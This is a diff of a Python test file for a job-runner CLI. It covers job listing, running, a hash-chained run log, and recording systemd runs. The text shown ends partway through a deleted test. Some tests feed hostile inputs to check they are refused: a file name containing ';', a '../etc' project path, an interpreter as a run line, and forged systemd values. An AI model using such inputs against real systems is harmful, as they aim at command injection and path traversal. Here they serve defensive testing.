@@ -1,58 +1,67 @@
-"""Tests for mes.jobs (mes jobs ...) and mes.units (systemd unit rendering)."""
+"""Tests for mes.jobs (mes jobs ...): running jobs on this computer, the run log, and the two
+helpers the server's system units call (record, allow-network).
+
+The rendering of the system units themselves is tested in test_units.py.
+"""
 
 from __future__ import annotations
 
+import hashlib
 import json
-import re
+import os
+import socket
 import subprocess
 import sys
 from pathlib import Path
 
 import pytest
 
-from mes import cli, jobs, units
-from mes.errors import MesError, Refused
-from mes.manifest import Job, Manifest, loads
+from mes import cli, jobs, paths
+from mes.errors import MesError, TemporaryFailure, UsageError
+from mes.manifest import loads
 
-APP_TOML = """
-[app]
+PROJECT_TOML = """
+[project]
 name = "demo"
-title = "Demo app"
+title = "Demo project"
 version = "0.1.0"
 
+[apps.demo]
+cli = "demo"
+
 [jobs.sync]
-run = "ok sync --days 3"
+run = "demo ok sync --days 3"
 schedule = "*-*-* 06:00:00"
 network = ["api.example.com"]
 
 [jobs.build]
-run = "touch build"
+run = "demo touch build"
 after = "sync"
 writes = ["data"]
 
 [jobs.report]
-run = "touch report"
+run = "demo touch report"
 after = "build"
 
 [jobs.export]
-run = "ok export"
+run = "demo ok export"
 manual = true
 
 [jobs.broken]
-run = "fail"
+run = "demo fail"
 manual = true
 
 [jobs.slow]
-run = "sleep"
+run = "demo sleep"
 manual = true
 timeout = "1s"
 
 [jobs.flaky]
-run = "temp"
+run = "demo temp"
 manual = true
 
 [jobs.after-broken]
-run = "touch after-broken"
+run = "demo touch after-broken"
 after = "broken"
 """
 
@@ -87,9 +96,9 @@ elif cmd[0] == "touch":
 """
 
 
-def make_app(root: Path, *, toml: str = APP_TOML, installed: bool = True) -> Path:
+def make_project(root: Path, *, toml: str = PROJECT_TOML, installed: bool = True) -> Path:
     root.mkdir(parents=True, exist_ok=True)
-    (root / "app.toml").write_text(toml)
+    (root / "project.toml").write_text(toml)
     (root / "pyproject.toml").write_text(
         '[project]\nname = "demo"\nversion = "0.1.0"\n\n[project.scripts]\ndemo = "demo.cli:main"\n'
     )
@@ -103,8 +112,8 @@ def make_app(root: Path, *, toml: str = APP_TOML, installed: bool = True) -> Pat
 
 
 @pytest.fixture
-def app_root(tmp_path):
-    return make_app(tmp_path / "apps" / "demo")
+def project_root(tmp_path):
+    return make_project(tmp_path / "projects" / "demo")
 
 
 def mes(capsys, *argv):
@@ -124,33 +133,45 @@ def log_file(mes_home) -> Path:
 # =========================================================================== list
 
 
-def test_list_json(app_root, capsys):
-    code, data = mes(capsys, "jobs", "list", "--app-dir", str(app_root))
+def test_list_json(project_root, capsys):
+    code, data = mes(capsys, "jobs", "list", "--project-dir", str(project_root))
     assert code == 0
-    assert data["app"] == "demo"
+    assert data["project"] == "demo"
     by = {j["name"]: j for j in data["jobs"]}
-    assert by["sync"]["trigger"] == "schedule"
+    assert by["sync"]["trigger"] == "schedule" and by["sync"]["app"] == "demo"
+    assert by["sync"]["argv"] == ["ok", "sync", "--days", "3"]
     assert by["sync"]["network"] == ["api.example.com"]
+    assert by["sync"]["network_enforced"] == {"server": True, "this_computer": False}
+    assert by["export"]["network_enforced"] == {"server": True, "this_computer": True}
     assert by["build"]["when"] == 'after "sync" succeeds'
     assert by["export"]["network"] is False
     assert by["slow"]["timeout"] == "1s"
+    assert data["warnings"] == []
 
 
-def test_list_text_from_current_folder(app_root, capsys, monkeypatch):
-    monkeypatch.chdir(app_root)
+def test_list_text_from_current_folder(project_root, capsys, monkeypatch):
+    monkeypatch.chdir(project_root)
     assert cli.run(["jobs", "list"]) == 0
     out = capsys.readouterr().out
     assert "sync" in out and "on schedule: *-*-* 06:00:00" in out
-    assert "api.example.com" in out
+    assert "only api.example.com (on a server)" in out
 
 
-def test_no_app_here(tmp_path, capsys, monkeypatch):
+def test_list_without_jobs(tmp_path, capsys):
+    root = make_project(tmp_path / "p", toml='[project]\nname = "demo"\n')
+    assert cli.run(["jobs", "list", "--project-dir", str(root)]) == 0
+    assert "has no jobs yet" in capsys.readouterr().out
+
+
+def test_no_project_here(tmp_path, capsys, monkeypatch):
     (tmp_path / "empty").mkdir()
     (tmp_path / "empty" / "pyproject.toml").write_text("[project]\nname='x'\n")
     monkeypatch.chdir(tmp_path / "empty")
     code, data = mes(capsys, "jobs", "list")
     assert code == 3
     assert data["error"]["code"] == "not_found"
+    code, data = mes(capsys, "jobs", "list", "--project-dir", str(tmp_path / "empty"))
+    assert code == 3 and "project.toml" in data["error"]["message"]
 
 
 def test_group_without_action_is_usage_error(capsys):
@@ -161,50 +182,52 @@ def test_group_without_action_is_usage_error(capsys):
 # =========================================================================== run
 
 
-def test_run_success_logs_and_sets_env(app_root, capsys, mes_home):
-    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
+def test_run_success_logs_and_sets_env(project_root, capsys, mes_home):
+    code, data = mes(capsys, "jobs", "run", "export", "--project-dir", str(project_root))
     assert code == 0, data
+    assert data["project"] == "demo"
     assert [r["job"] for r in data["runs"]] == ["export"]
     out = data["runs"][0]["data"]  # the app runs with --json, so its data comes back parsed
     assert out == json.loads(data["runs"][0]["output"])
     assert out["argv"] == ["ok", "export"]
     assert out["allow"] == "write"
     assert out["job"] == "export"
-    assert Path(out["cwd"]).resolve() == app_root.resolve()
+    assert Path(out["cwd"]).resolve() == project_root.resolve()
 
     records = jobs.read_log(log_file(mes_home))
     assert len(records) == 1
     rec = records[0]
     assert rec["job"] == "export" and rec["exit_code"] == 0 and rec["result"] == "success"
-    assert rec["argv"] == [str(app_root / ".venv" / "bin" / "demo"), "--json", "ok", "export"]
+    assert rec["project"] == "demo" and rec["app"] == "demo" and rec["via"] == "mes jobs run"
+    assert rec["argv"] == [str(project_root.resolve() / ".venv" / "bin" / "demo"), "--json", "ok", "export"]
     assert rec["prev"] == jobs.GENESIS
     assert set(rec) >= {"time", "job", "argv", "exit_code", "duration_s", "prev"}
     assert oct(log_file(mes_home).stat().st_mode & 0o777) == oct(0o600)
 
 
-def test_run_text_mode(app_root, capsys):
-    assert cli.run(["jobs", "run", "export", "--app-dir", str(app_root)]) == 0
+def test_run_text_mode(project_root, capsys):
+    assert cli.run(["jobs", "run", "export", "--project-dir", str(project_root)]) == 0
     out = capsys.readouterr().out
     assert 'Job "export" finished successfully' in out
 
 
-def test_run_follows_after_chain(app_root, capsys, mes_home):
-    code, data = mes(capsys, "jobs", "run", "sync", "--app-dir", str(app_root))
+def test_run_follows_after_chain(project_root, capsys, mes_home):
+    code, data = mes(capsys, "jobs", "run", "sync", "--project-dir", str(project_root))
     assert code == 0, data
     assert [r["job"] for r in data["runs"]] == ["sync", "build", "report"]
     assert order_file(mes_home).read_text().split() == ["build", "report"]
     assert [r["job"] for r in jobs.read_log(log_file(mes_home))] == ["sync", "build", "report"]
 
 
-def test_run_no_chain(app_root, capsys, mes_home):
-    code, data = mes(capsys, "jobs", "run", "sync", "--no-chain", "--app-dir", str(app_root))
+def test_run_no_chain(project_root, capsys, mes_home):
+    code, data = mes(capsys, "jobs", "run", "sync", "--no-chain", "--project-dir", str(project_root))
     assert code == 0
     assert [r["job"] for r in data["runs"]] == ["sync"]
     assert not order_file(mes_home).exists()
 
 
-def test_run_failure_stops_chain(app_root, capsys, mes_home):
-    code, data = mes(capsys, "jobs", "run", "broken", "--app-dir", str(app_root))
+def test_run_failure_stops_chain(project_root, capsys, mes_home):
+    code, data = mes(capsys, "jobs", "run", "broken", "--project-dir", str(project_root))
     assert code == 1
     assert data["error"]["code"] == "job_failed"
     assert 'The job "broken" stopped with an error' in data["error"]["message"]
@@ -216,16 +239,16 @@ def test_run_failure_stops_chain(app_root, capsys, mes_home):
     assert rec["result"] == "exit-code" and rec["exit_code"] == 3
 
 
-def test_run_failure_text_goes_to_stderr(app_root, capsys):
-    assert cli.run(["jobs", "run", "broken", "--app-dir", str(app_root)]) == 1
+def test_run_failure_text_goes_to_stderr(project_root, capsys):
+    assert cli.run(["jobs", "run", "broken", "--project-dir", str(project_root)]) == 1
     cap = capsys.readouterr()
     assert cap.out == ""
     assert 'The job "broken" stopped with an error' in cap.err and "What to do:" in cap.err
     assert "What the app said:\nthe source refused the request" in cap.err
 
 
-def test_run_timeout_is_stopped(app_root, capsys, mes_home):
-    code, data = mes(capsys, "jobs", "run", "slow", "--app-dir", str(app_root))
+def test_run_timeout_is_stopped(project_root, capsys, mes_home):
+    code, data = mes(capsys, "jobs", "run", "slow", "--project-dir", str(project_root))
     assert code == 1
     assert data["error"]["code"] == "job_timeout"
     rec = jobs.read_log(log_file(mes_home))[-1]
@@ -233,50 +256,81 @@ def test_run_timeout_is_stopped(app_root, capsys, mes_home):
     assert rec["duration_s"] < 15
 
 
-def test_run_temporary_failure_exit_75(app_root, capsys):
-    code, data = mes(capsys, "jobs", "run", "flaky", "--app-dir", str(app_root))
+def test_run_temporary_failure_exit_75(project_root, capsys):
+    code, data = mes(capsys, "jobs", "run", "flaky", "--project-dir", str(project_root))
     assert code == 75
     assert data["error"]["code"] == "job_temporary"
 
 
-def test_run_unknown_job(app_root, capsys):
-    code, data = mes(capsys, "jobs", "run", "nope", "--app-dir", str(app_root))
+def test_run_unknown_job(project_root, capsys):
+    code, data = mes(capsys, "jobs", "run", "nope", "--project-dir", str(project_root))
     assert code == 3
     assert "export" in data["error"]["hint"]
 
 
-def test_run_needs_write_level(app_root, capsys, monkeypatch, mes_home):
+def test_run_needs_write_level(project_root, capsys, monkeypatch, mes_home):
     monkeypatch.setenv("MES_ALLOW", "read")
-    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
+    code, data = mes(capsys, "jobs", "run", "export", "--project-dir", str(project_root))
     assert code == 4
     assert not log_file(mes_home).exists()
-    code, _ = mes(capsys, "jobs", "list", "--app-dir", str(app_root))
+    code, _ = mes(capsys, "jobs", "list", "--project-dir", str(project_root))
     assert code == 0
 
 
 def test_run_app_not_installed(tmp_path, capsys):
-    root = make_app(tmp_path / "bare", installed=False)
-    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(root))
+    root = make_project(tmp_path / "bare", installed=False)
+    code, data = mes(capsys, "jobs", "run", "export", "--project-dir", str(root))
     assert code == 3
     assert data["error"]["code"] == "app_not_installed"
     assert "uv sync" in data["error"]["hint"]
+    # Showing the jobs still works without the program.
+    code, data = mes(capsys, "jobs", "list", "--project-dir", str(root))
+    assert code == 0 and data["warnings"] == []
 
 
-def test_run_twice_at_once_is_refused(app_root, capsys, mes_home):
-    _, manifest = jobs.load_app(app_root)
-    job = manifest.job("export")
-    with jobs._job_lock(manifest, job):
-        code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
+def test_run_twice_at_once_is_refused(project_root, capsys, mes_home):
+    _, project = jobs.load_project(project_root)
+    job = project.job("export")
+    with jobs._job_lock(project, job):
+        code, data = mes(capsys, "jobs", "run", "export", "--project-dir", str(project_root))
     assert code == 75
     assert data["error"]["code"] == "job_running"
 
 
 def test_run_never_uses_a_shell(tmp_path, capsys, mes_home):
-    toml = '[app]\nname = "demo"\n[jobs.x]\nrun = "touch \'a b;c\'"\nmanual = true\n'
-    root = make_app(tmp_path / "shell", toml=toml)
-    code, _ = mes(capsys, "jobs", "run", "x", "--app-dir", str(root))
+    toml = '[project]\nname = "demo"\n[jobs.x]\nrun = "demo touch \'a b;c\'"\nmanual = true\n'
+    root = make_project(tmp_path / "shell", toml=toml)
+    code, _ = mes(capsys, "jobs", "run", "x", "--project-dir", str(root))
     assert code == 0
     assert order_file(mes_home).read_text() == "a b;c\n"
+
+
+def test_two_apps_in_one_project(tmp_path, capsys, mes_home):
+    toml = ('[project]\nname = "demo"\n[apps.demo]\ncli = "demo"\n[apps.tool]\ncli = "tool"\n'
+            '[jobs.a]\nrun = "demo ok a"\nmanual = true\n[jobs.b]\nrun = "tool ok b"\nafter = "a"\n')
+    root = make_project(tmp_path / "two", toml=toml)
+    tool = root / ".venv" / "bin" / "tool"
+    tool.write_text(FAKE_APP.format(python=sys.executable).replace(
+        'os.environ.get("FAKE_APP_NAME", "demo")', '"tool"'))
+    tool.chmod(0o755)
+    code, data = mes(capsys, "jobs", "run", "a", "--project-dir", str(root))
+    assert code == 0, data
+    assert [(r["job"], r["data"]["argv"]) for r in data["runs"]] == [("a", ["ok", "a"]), ("b", ["ok", "b"])]
+    assert [r["app"] for r in jobs.read_log(log_file(mes_home))] == ["demo", "tool"]
+
+
+def test_run_line_must_start_with_an_app_of_the_project(tmp_path, capsys):
+    toml = '[project]\nname = "demo"\n[jobs.x]\nrun = "python -c 1"\nmanual = true\n'
+    root = make_project(tmp_path / "bad", toml=toml)
+    code, data = mes(capsys, "jobs", "list", "--project-dir", str(root))
+    assert code != 0 and "not an app of this project" in data["error"]["message"]
+
+
+def test_interpreter_is_never_an_app_program(tmp_path):
+    toml = '[project]\nname = "demo"\n[apps.demo]\ncli = "python3"\n[jobs.x]\nrun = "demo ok"\nmanual = true\n'
+    root = make_project(tmp_path / "py", toml=toml)
+    with pytest.raises(MesError):
+        jobs.load_project(root)
 
 
 # =========================================================================== run log
@@ -289,8 +343,6 @@ def test_log_chain_and_verify(tmp_path):
     jobs.append_record(log, {"time": "t3", "job": "c"})
     lines = log.read_bytes().splitlines()
     assert a["prev"] == jobs.GENESIS
-    import hashlib
-
     assert b["prev"] == hashlib.sha256(lines[0]).hexdigest()
     assert json.loads(lines[2])["prev"] == hashlib.sha256(lines[1]).hexdigest()
     res = jobs.verify_log(log)
@@ -338,468 +390,314 @@ def test_verify_detects_garbage_line(tmp_path):
     assert "line 2" in e.value.message
 
 
-def test_log_command(app_root, capsys, mes_home):
-    mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
-    mes(capsys, "jobs", "run", "sync", "--app-dir", str(app_root))
-    code, data = mes(capsys, "jobs", "log", "--app-dir", str(app_root))
+def test_log_command(project_root, capsys, mes_home):
+    mes(capsys, "jobs", "run", "export", "--project-dir", str(project_root))
+    mes(capsys, "jobs", "run", "sync", "--project-dir", str(project_root))
+    code, data = mes(capsys, "jobs", "log", "--project-dir", str(project_root))
     assert code == 0
     assert [r["job"] for r in data["runs"]] == ["export", "sync", "build", "report"]
-    code, data = mes(capsys, "jobs", "log", "--job", "build", "--limit", "5", "--app-dir", str(app_root))
+    code, data = mes(capsys, "jobs", "log", "--job", "build", "--limit", "5", "--project-dir", str(project_root))
     assert [r["job"] for r in data["runs"]] == ["build"]
-    code, data = mes(capsys, "jobs", "log", "--verify", "--app-dir", str(app_root))
+    code, data = mes(capsys, "jobs", "log", "--verify", "--project-dir", str(project_root))
     assert code == 0 and data["ok"] and data["records"] == 4
+    code, data = mes(capsys, "jobs", "log", "--limit", "0", "--project-dir", str(project_root))
+    assert code == 2
 
     text = log_file(mes_home).read_text().replace('"job":"export"', '"job":"exporT"')
     log_file(mes_home).write_text(text)
-    code, data = mes(capsys, "jobs", "log", "--verify", "--app-dir", str(app_root))
+    code, data = mes(capsys, "jobs", "log", "--verify", "--project-dir", str(project_root))
     assert code == 1 and data["error"]["code"] == "run_log_broken"
 
 
-def test_status_shows_last_run(app_root, capsys, monkeypatch):
-    monkeypatch.setattr(jobs, "_is_linux", lambda: False)
-    mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
-    code, data = mes(capsys, "jobs", "status", "--app-dir", str(app_root))
+def test_log_of_the_server(tmp_path, capsys):
+    layout = paths.server_layout("demo", tmp_path / "srv")
+    jobs.append_record(layout.run_log, {"time": "t", "project": "demo", "job": "sync", "via": "systemd"})
+    code, data = mes(capsys, "jobs", "log", "--project", "demo", "--server-root", str(tmp_path / "srv"))
+    assert code == 0 and [r["job"] for r in data["runs"]] == ["sync"] and data["project"] == "demo"
+    code, data = mes(capsys, "jobs", "log", "--verify", "--project", "demo", "--server-root", str(tmp_path / "srv"))
+    assert code == 0 and data["records"] == 1
+    code, data = mes(capsys, "jobs", "log", "--server-root", str(tmp_path / "srv"))
+    assert code == 2
+    code, data = mes(capsys, "jobs", "log", "--project", "../etc", "--server-root", str(tmp_path / "srv"))
+    assert code == 2
+
+
+def test_status_shows_last_run(project_root, capsys):
+    mes(capsys, "jobs", "run", "export", "--project-dir", str(project_root))
+    code, data = mes(capsys, "jobs", "status", "--project-dir", str(project_root))
     assert code == 0
     by = {r["job"]: r for r in data["jobs"]}
     assert by["export"]["last_result"] == "success" and by["export"]["last_exit_code"] == 0
     assert by["sync"]["last_run"] is None
-    assert by["sync"]["installed"] is False and "Linux" in by["sync"]["installed_note"]
+    assert "mes server check" in data["note"]
 
 
-# =========================================================================== install / uninstall
-
-
-def test_install_on_macos_explains(app_root, capsys, monkeypatch):
-    monkeypatch.setattr(jobs, "_is_linux", lambda: False)
-    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
+def test_install_has_moved_to_server_plan(project_root, capsys):
+    code, data = mes(capsys, "jobs", "install", "--project-dir", str(project_root))
     assert code == 1
-    assert data["error"]["code"] == "needs_linux"
-    assert "Linux server" in data["error"]["message"]
+    assert data["error"]["code"] == "moved"
+    assert "mes server plan" in data["error"]["hint"]
+    code, data = mes(capsys, "jobs", "install", "--render-only")
+    assert code == 1 and data["error"]["code"] == "moved"
 
 
-def test_install_needs_admin(app_root, capsys, monkeypatch):
-    monkeypatch.setenv("MES_ALLOW", "write")
-    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
-    assert code == 4
-
-
-def test_render_only_out(app_root, capsys, tmp_path):
-    out = tmp_path / "units out"
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(out), "--app-dir", str(app_root))
-    assert code == 0, data
-    names = sorted(p.name for p in out.iterdir())
-    assert names == sorted([
-        "mes.slice",
-        "mes-demo-sync.service", "mes-demo-sync.timer",
-        "mes-demo-build.service", "mes-demo-report.service",
-        "mes-demo-export.service", "mes-demo-broken.service", "mes-demo-slow.service",
-        "mes-demo-flaky.service", "mes-demo-after-broken.service",
-    ])
-    assert data["files"] == names
-    assert [w for w in data["warnings"] if "simple check" not in w] == []
-    assert any("api.example.com" in s for s in data["what_happens"])
-
-
-def test_render_only_inline_and_out_needs_render_only(app_root, capsys, tmp_path):
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(app_root))
-    assert code == 0
-    assert "mes-demo-sync.timer" in data["units"]
-    code, data = mes(capsys, "jobs", "install", "--out", str(tmp_path / "x"), "--app-dir", str(app_root))
-    assert code == 2
-
-
-def test_render_only_warns_when_not_installed(tmp_path, capsys):
-    root = make_app(tmp_path / "bare", installed=False)
-    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(root))
-    assert code == 0
-    assert data["warnings"] and "uv sync" in data["warnings"][0]
-
-
-class FakeSystemd:
-    def __init__(self):
-        self.calls: list[tuple[str, ...]] = []
-
-    def __call__(self, *args):
-        self.calls.append(args)
-        return subprocess.CompletedProcess(["systemctl", "--user", *args], 0, "", "")
-
-
-@pytest.fixture
-def linux(monkeypatch):
-    fake = FakeSystemd()
-    monkeypatch.setattr(jobs, "_is_linux", lambda: True)
-    monkeypatch.setattr(jobs, "_has_systemd", lambda: True)
-    monkeypatch.setattr(jobs, "_systemctl", fake)
-    monkeypatch.setattr(jobs, "_linger_warning", lambda: None)
-    monkeypatch.setattr(jobs, "_check_schedules", lambda m: None)
-    return fake
-
-
-def test_install_and_uninstall_on_linux(app_root, capsys, linux, mes_home):
-    unit_dir = mes_home["xdg_config"] / "systemd" / "user"
-    # A unit of another app whose name starts the same way must be left alone.
-    unit_dir.mkdir(parents=True)
-    other = unit_dir / "mes-demo-x-sync.service"
-    other.write_text(units.HEADER + "\n# mes-app: demo-x\n# mes-job: sync\n")
-
-    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
-    assert code == 0, data
-    assert (unit_dir / "mes-demo-sync.timer").is_file()
-    assert (unit_dir / "mes.slice").is_file()
-    assert ("daemon-reload",) in linux.calls
-    assert ("enable", "--now", "mes-demo-sync.timer") in linux.calls
-    assert data["timers_started"] == ["mes-demo-sync.timer"]
-    assert log_file(mes_home).is_file()  # must exist for ReadOnlyPaths
-    assert (mes_home["data"] / "demo").is_dir()
-    assert oct((unit_dir / "mes-demo-sync.service").stat().st_mode & 0o777) == oct(0o644)
-
-    # Removing a job from app.toml removes its unit on the next install.
-    (app_root / "app.toml").write_text(APP_TOML.replace("[jobs.flaky]\nrun = \"temp\"\nmanual = true\n", ""))
-    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
-    assert code == 0
-    assert data["removed"] == ["mes-demo-flaky.service"]
-    assert not (unit_dir / "mes-demo-flaky.service").exists()
-
-    code, data = mes(capsys, "jobs", "status", "--app-dir", str(app_root))
-    assert {r["job"]: r["installed"] for r in data["jobs"]}["sync"] is True
-
-    code, data = mes(capsys, "jobs", "uninstall", "--app", "demo")
-    assert code == 0
-    assert "mes-demo-sync.timer" in data["removed"]
-    assert ("disable", "--now", "mes-demo-sync.timer") in linux.calls
-    assert not list(unit_dir.glob("mes-demo-s*"))
-    assert other.is_file()
-    assert log_file(mes_home).is_file()  # data and log kept
-
-
-def test_install_refuses_foreign_unit(app_root, capsys, linux, mes_home):
-    unit_dir = mes_home["xdg_config"] / "systemd" / "user"
-    unit_dir.mkdir(parents=True)
-    (unit_dir / "mes-demo-sync.service").write_text("[Service]\nExecStart=/bin/true\n")
-    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
-    assert code == 5
-    assert data["error"]["code"] == "unit_conflict"
-
-
-def test_install_requires_installed_program(tmp_path, capsys, linux):
-    root = make_app(tmp_path / "bare", installed=False)
-    code, data = mes(capsys, "jobs", "install", "--app-dir", str(root))
-    assert code == 3 and data["error"]["code"] == "app_not_installed"
-
-
-def test_uninstall_on_macos_is_harmless(app_root, capsys, monkeypatch):
-    monkeypatch.setattr(jobs, "_is_linux", lambda: False)
-    code, data = mes(capsys, "jobs", "uninstall", "--app-dir", str(app_root))
-    assert code == 0 and data["removed"] == []
-
+# =========================================================================== record (root, after each run)
 
 INVOCATION = "0123456789abcdef0123456789abcdef"
 
 
-def test_record_from_systemd(app_root, capsys, monkeypatch, mes_home):
+@pytest.fixture
+def server_root(tmp_path):
+    root = tmp_path / "srv"
+    layout = paths.server_layout("demo", root)
+    layout.log.mkdir(parents=True, mode=0o750)
+    return root
+
+
+def _systemd_env(monkeypatch, *, status="2", result="exit-code"):
     monkeypatch.setattr(jobs, "_is_linux", lambda: True)
     monkeypatch.setenv("INVOCATION_ID", INVOCATION)
-    monkeypatch.setattr(jobs, "_show", lambda unit, *p: {
-        "InvocationID": INVOCATION,
-        "ExecMainStartTimestampMonotonic": "1000000", "ExecMainExitTimestampMonotonic": "3500000"})
-    monkeypatch.setenv("SERVICE_RESULT", "exit-code")
+    monkeypatch.setenv("SERVICE_RESULT", result)
     monkeypatch.setenv("EXIT_CODE", "exited")
-    monkeypatch.setenv("EXIT_STATUS", "2")
-    code, data = mes(capsys, "jobs", "record", "sync", "--app-dir", str(app_root))
+    monkeypatch.setenv("EXIT_STATUS", status)
+    asked = []
+
+    def show(unit, *props):
+        asked.append(unit)
+        return {"InvocationID": INVOCATION, "ExecMainStartTimestampMonotonic": "1000000",
+                "ExecMainExitTimestampMonotonic": "3500000"}
+
+    monkeypatch.setattr(jobs, "_show", show)
+    return asked
+
+
+def test_record_from_systemd(server_root, capsys, monkeypatch):
+    asked = _systemd_env(monkeypatch)
+    code, data = mes(capsys, "jobs", "record", "--project", "demo", "--server-root", str(server_root), "sync")
     assert code == 0, data
-    rec = jobs.read_log(log_file(mes_home))[-1]
+    assert asked == ["mes-demo.job.sync.service"] * 2
+    log = paths.server_layout("demo", server_root).run_log
+    rec = jobs.read_log(log)[-1]
     assert rec["via"] == "systemd" and rec["exit_code"] == 2 and rec["result"] == "exit-code"
-    assert rec["duration_s"] == 2.5
-    assert rec["argv"][1:] == ["ok", "sync", "--days", "3"]
+    assert rec["duration_s"] == 2.5 and rec["unit"] == "mes-demo.job.sync.service"
+    assert rec["project"] == "demo" and rec["job"] == "sync" and rec["prev"] == jobs.GENESIS
+    assert "argv" not in rec  # root reads nothing from the project's files
+    code, data = mes(capsys, "jobs", "log", "--verify", "--project", "demo", "--server-root", str(server_root))
+    assert code == 0 and data["records"] == 1
 
 
-# =========================================================================== unit rendering
-
-DIRECTIVES = {
-    "Unit": {"Description", "OnSuccess"},
-    "Service": {
-        "Type", "ExecStart", "ExecStopPost", "WorkingDirectory", "Environment", "Slice", "MemoryMax",
-        "MemorySwapMax", "TimeoutStartSec", "RuntimeMaxSec", "UMask", "NoNewPrivileges", "PrivateUsers",
-        "PrivateTmp", "ProtectSystem", "ProtectHome", "ReadWritePaths", "ReadOnlyPaths", "PrivateNetwork",
-        "RestrictAddressFamilies", "RestrictSUIDSGID", "LockPersonality", "RestrictRealtime",
-        "RestrictNamespaces", "ProtectKernelTunables", "ProtectKernelModules", "ProtectControlGroups",
-        "SystemCallArchitectures", "SystemCallFilter",
-    },
-    "Timer": {"OnCalendar", "Persistent", "RandomizedDelaySec", "Unit"},
-    "Install": {"WantedBy"},
-    "Slice": set(),
-}
+def test_record_killed_job_has_no_exit_code(server_root, capsys, monkeypatch):
+    _systemd_env(monkeypatch, result="timeout")
+    monkeypatch.setenv("EXIT_CODE", "killed")
+    monkeypatch.setenv("EXIT_STATUS", "TERM")
+    code, data = mes(capsys, "jobs", "record", "--project", "demo", "--server-root", str(server_root), "sync")
+    assert code == 0 and data["exit_code"] is None and data["result"] == "timeout"
 
 
-def directives(text: str) -> list[tuple[str, str, str]]:
-    """Parse a unit like systemd would (sections, Key=Value, continuation lines) and check it."""
-    out = []
-    section = None
-    for raw in text.split("\n"):
-        assert "\r" not in raw
-        assert not raw.endswith("\\"), f"line continuation in {raw!r}"
-        line = raw.strip()
-        if not line or line[0] in "#;":
-            continue
-        if line.startswith("["):
-            section = line.strip("[]")
-            assert section in DIRECTIVES, section
-            continue
-        key, sep, value = line.partition("=")
-        assert sep, f"not a directive: {raw!r}"
-        assert key in DIRECTIVES[section], f"unexpected directive {key!r} in [{section}]"
-        out.append((section, key, value))
-    return out
+def test_forged_systemd_record_is_refused(server_root, capsys, monkeypatch):
+    for k, v in {"SERVICE_RESULT": "success", "EXIT_CODE": "exited", "EXIT_STATUS": "0"}.items():
+        monkeypatch.setenv(k, v)
+    argv = ("jobs", "record", "--project", "demo", "--server-root", str(server_root), "sync")
+    monkeypatch.setattr(jobs, "_is_linux", lambda: False)
+    code, data = mes(capsys, *argv)
+    assert code == 5 and data["error"]["code"] == "not_from_systemd"
+    monkeypatch.setattr(jobs, "_is_linux", lambda: True)
+    monkeypatch.setenv("INVOCATION_ID", "not-hex")
+    code, data = mes(capsys, *argv)
+    assert code == 5
+    monkeypatch.setenv("INVOCATION_ID", INVOCATION)
+    monkeypatch.setattr(jobs, "_show", lambda unit, *p: {"InvocationID": "f" * 32})
+    code, data = mes(capsys, *argv)
+    assert code == 5
+    assert not paths.server_layout("demo", server_root).run_log.exists()
 
 
-def values(text: str, key: str) -> list[str]:
-    return [v for _, k, v in directives(text) if k == key]
-
-
-def split_exec(value: str) -> list[str]:
-    """Undo quote_exec_word for a line of fully quoted words."""
-    words = re.findall(r'"((?:[^"\\]|\\.)*)"', value)
-    assert " ".join(f'"{w}"' for w in words) == value.lstrip("+")
-    return [re.sub(r"\\(.)", r"\1", w).replace("%%", "%").replace("$$", "$") for w in words]
-
-
-def render(manifest, *, root="/srv/apps/demo", data_home="/home/u/.local/share/mes",
-           state_home="/home/u/.local/state/mes", exe="/srv/apps/demo/.venv/bin/demo"):
-    return units.render_app(
-        manifest, app_command=[exe], mes_command=["/usr/bin/python3", "-m", "mes.cli"],
-        root=root, data_home=data_home, state_home=state_home,
-    )
-
-
-@pytest.fixture
-def manifest():
-    return loads(APP_TOML)
-
-
-def test_service_directives(manifest):
-    files = render(manifest)
-    svc = files["mes-demo-export.service"]
-    d = {k: v for _, k, v in directives(svc) if k not in ("Environment", "ReadWritePaths")}
-    assert d["Type"] == "oneshot"
-    assert split_exec(d["ExecStart"]) == ["/srv/apps/demo/.venv/bin/demo", "ok", "export"]
-    assert d["ExecStopPost"].startswith("+")
-    assert split_exec(d["ExecStopPost"]) == [
-        "/usr/bin/python3", "-m", "mes.cli", "jobs", "record", "--app-dir", "/srv/apps/demo", "export"]
-    assert d["MemoryMax"] == "256M"
-    assert d["TimeoutStartSec"] == "900"
-    assert d["RuntimeMaxSec"] == str(900 + units.TIMEOUT_GRACE_SEC)
-    for key, val in [("NoNewPrivileges", "yes"), ("PrivateTmp", "yes"), ("ProtectSystem", "strict"),
-                     ("ProtectHome", "read-only"), ("PrivateNetwork", "yes"), ("RestrictSUIDSGID", "yes"),
-                     ("LockPersonality", "yes"), ("SystemCallFilter", "@system-service"),
-                     ("UMask", "0077"), ("Slice", "mes.slice")]:
-        assert d[key] == val, key
-    assert values(svc, "ReadWritePaths") == ["/home/u/.local/share/mes/demo", "/home/u/.local/state/mes/demo"]
-    assert d["ReadOnlyPaths"] == "/home/u/.local/state/mes/demo/runs.jsonl"
-    assert '"MES_ALLOW=write"' in values(svc, "Environment")
-    assert "[Install]" not in svc
-
-
-def test_network_and_writes(manifest):
-    files = render(manifest)
-    sync = files["mes-demo-sync.service"]
-    assert values(sync, "PrivateNetwork") == []
-    assert values(sync, "RestrictAddressFamilies") == ["AF_UNIX AF_INET AF_INET6"]
-    assert "# network: full internet access (meant for api.example.com; mes cannot limit it" in sync
-    build = files["mes-demo-build.service"]
-    assert values(build, "ReadWritePaths") == ["/home/u/.local/share/mes/demo"]
-
-
-def test_timer_and_after(manifest):
-    files = render(manifest)
-    timer = files["mes-demo-sync.timer"]
-    t = {k: v for _, k, v in directives(timer)}
